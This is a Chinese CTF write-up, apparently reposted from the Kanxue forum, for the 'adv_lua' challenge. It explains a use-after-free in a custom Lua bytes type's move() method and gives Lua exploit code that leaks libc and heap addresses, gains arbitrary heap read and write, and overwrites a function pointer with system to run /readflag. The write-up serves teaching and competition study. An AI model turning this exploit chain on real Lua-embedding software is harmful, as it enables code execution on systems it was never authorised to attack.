# 华为杯研究生国赛 adv_lua

> 原文: https://www.ctfiot.com/151498.html
> ID: 151498

复现华为杯研究生国赛的adv_lua题目：

从题目描述来看，漏洞应该和bytearray相关。

用IDA逆向一下然后直接字符串搜索bytearray。

只有这里有bytearray字样，继续查找交叉引用：

可以看到一系列方法，显然都是为bytearray所注册的吗，刚才我们看到的函数是来自__tostring。

最终追溯到具体的数据类型是bytes，上网搜索了一下，发现原来lua本来并没有这个bytes数据结构，所以也许这是作者自己加进去的一个数据结构，所以需要对数据结构中的几个方法进行漏洞分析。

在move方法中：

程序首先获取两个参数，分别为dst和src，其本意为free掉dst本来指向的内存，然后将src的内存指针给dst处，最后将src指针归零。从而完成move操作，但是当dst和src指向相同的一块内存A时，操作则变成了先是释放A，然后让src不再指向A了，再让dst指向A，从而在dst处形成了一个悬垂指针，即发生了UAF。

接下来做个小测试，写出读写指定地址的函数来，试一试能不能读取到UAF后内存中的敏感信息。

barr = bytes.new(1)

function get_int64(obj, off)
 res = 0
 for i=0,7,1 do
 res = res + (obj.get(obj, i+off) << (i*8))
 end
 return res;
end

function set_int64(obj, off, val)
 --print(val)
 for i=0,7,1 do
 tmp = (math.floor(val) >> i*8) & 0xff
 obj.set(obj, i+off, tmp)
 end
end
print(barr.move(barr,barr))

发现double free了。

好消息是，src和dst指向同一块地址雀食有问题，坏消息是，问题好像有点大。

没关系我们先记下这里的漏洞，然后继续分析数据类型的方法，再来看看new方法。

对于new方法上面有一些解析数字的就略过了，直接看这里，首先会有一个0x10大小的userdatauv头部（从内存中来看实际上是0x30大小），然后前八字节装size，后八字节装分配到的address，这里注意意见事情，它malloc之后是没有memset的，所以意味着我们也许可以进行一些地址上的泄露。

注：后续的所有操作均在ubuntu22的机器上进行，不额外进行其他libc版本的适配工作了。

申请个大堆释放到unsortedbin里，然后申请出来，可以看到由于new的时候非常的干净没有任何附加值，所以libc地址已经进到chunk里了，接下来直接打印出来就行，堆地址同理。

a = bytes.new(0x430)
b = bytes.new(0x20)
a.move(a,b)
c = bytes.new(0x20)
libcbase=get_int64(c,0)-0x219ce0
c.move(c,a)
c = bytes.new(0x20)
heapbase=(get_int64(c,0)<<12)-0x600
print(string.format("[+] libcbase address is 0x%x", libcbase))
print(string.format("[+] heapbase address is 0x%x", heapbase))

进行到获取堆地址这里还是非常轻松的，接下来就要考虑如何控制程序执行流，作者在描述中写的非常清楚，不需要进行其他操作，只要能执行/readflag就可以，也就是说能够成功构造system(‘/readflag’)即可，现在system已经有了，还剩下两点需要考虑，一是如何控制执行流，二是如何获取’/readflag’字符串。

对于控制程序执行流，首先需要构造任意地址写原语，到这里就不得不祭出之前在move中找到的漏洞了，现在似乎必须弄清楚为什么会double free了，明明我们逆向出的它是个UAF，通过调试发现，原来是程序结束的时候会将用到的内存都释放掉，但是之前这里是个UAF，并且程序还直接结束了没有进行后续的处理，所以最后显示出来的是个double free，也是有点无语哈哈哈哈。

所以我们还是可以直接将其作为UAF来使用的，另外就是这个set和get都有这么一个函数卡着我们：

其作用大致就是在读写之前会检查一下那个0x30大小的堆头，里面存放着size和address的那个东西，检查size是不是过大，以及地址是不是合法等等，比如这里有一个条件是v2>>40-85不能大于等于2，这意味着什么呢？

>>> hex(87<<40)
'0x570000000000'
>>>

即我们不能通过UAF申请到libc上的地址了。还有其他一些类似的限制，导致我们能够选择的路并不多，修改存在于堆上的函数指针是一条路。

通过大量打印堆上的数据能够发现，有很多函数的table是直接存放于堆上的。

看了一圈别的地方的表上都有函数名，只有这个解析不出来。

大概率这里就是作者自己添加的数据结构所注册的函数表了。现在尝试通过UAF申请到函数表上并将其修改。

a=bytes.new(0x20)
a=bytes.new(0x20)
a=bytes.new(0x20)
a.move(a,a)
set_int64(a,0,0x6161616161616161)

从结果可以看到UAF是完全ok的，只要我程序不跑完是不会发生double free的。

直接申请到0x3870的内存可能需要一定的堆风水，但是这里别忘了我们是UAF，如果我们申请出一个大小和堆头结构一样大的chunk，free掉它获取悬垂指针以后再申请一个正常的chunk，就可以直接控制某个byte的堆头结构，然后修改其0x28偏移处的address，就可以无需任何堆风水直接进行任意堆地址的get和set。

a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)

a.move(a,a)
b=bytes.new(0xb8)
set_int64(a,0x28,target)

set_int64(b,0,0x6161616161616161)

成功修改堆头数据的address字段为target。

尝试将函数指针修改为system。

可以看到这里已经成功将函数指针修改为system。

经过尝试发现是有一定概率执行到system函数的，最后的一个问题就是如何控制rdi参数。可以看到每次调用函数，rdi都会指向堆上的一个固定偏移的地方，应该是某个固定的结构体，我们可以通过相同的手法，将target改到这个堆上，然后直接修改指定位置为/readflag字符串。

set_int64(a,0x28,heapbase+0x2a0)
set_int64(b, 0x8, 0x616c66646165722f)
set_int64(b, 0x10, 0x67)

最终成功执行了/readflag函数。

看雪ID：Ayakaaa

https://bbs.kanxue.com/user-home-954038.htm

*本文为看雪论坛优秀文章，由 Ayakaaa 原创，转载请注明来自看雪社区

# 往期推荐

1、2023 SDC 议题回顾 | 芯片安全和无线电安全底层渗透技术

2、SWPUCTF 2021 新生赛-老鼠走迷宫

3、OWASP 实战分析 level 1

4、【远控木马】银狐组织最新木马样本-分析

5、自研Unidbg trace工具实战ollvm反混淆

6、2023 SDC 议题回顾 | 深入 Android 可信应用漏洞挖掘

球分享

球点赞

球在看


```
barr = bytes.new(1)

function get_int64(obj, off)
 res = 0
 for i=0,7,1 do
 res = res + (obj.get(obj, i+off) << (i*8))
 end
 return res;
end

function set_int64(obj, off, val)
 --print(val)
 for i=0,7,1 do
 tmp = (math.floor(val) >> i*8) & 0xff
 obj.set(obj, i+off, tmp)
 end
end
print(barr.move(barr,barr))
```



```
a = bytes.new(0x430)
b = bytes.new(0x20)
a.move(a,b)
c = bytes.new(0x20)
libcbase=get_int64(c,0)-0x219ce0
c.move(c,a)
c = bytes.new(0x20)
heapbase=(get_int64(c,0)<<12)-0x600
print(string.format("[+] libcbase address is 0x%x", libcbase))
print(string.format("[+] heapbase address is 0x%x", heapbase))
```



```
>>> hex(87<<40)
'0x570000000000'
>>>
```



```
a=bytes.new(0x20)
a=bytes.new(0x20)
a=bytes.new(0x20)
a.move(a,a)
set_int64(a,0,0x6161616161616161)
```



```
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)
a=bytes.new(0x30)

a.move(a,a)
b=bytes.new(0xb8)
set_int64(a,0x28,target)

set_int64(b,0,0x6161616161616161)
```



```
set_int64(a,0x28,heapbase+0x2a0)
set_int64(b, 0x8, 0x616c66646165722f)
set_int64(b, 0x10, 0x67)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1702741294.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1702741294.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1702741294.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/9-1702741295.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1702741295.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/4-1702741296.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/8-1702741296.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/10-1702741297.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/9-1702741297.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702741297.jpeg)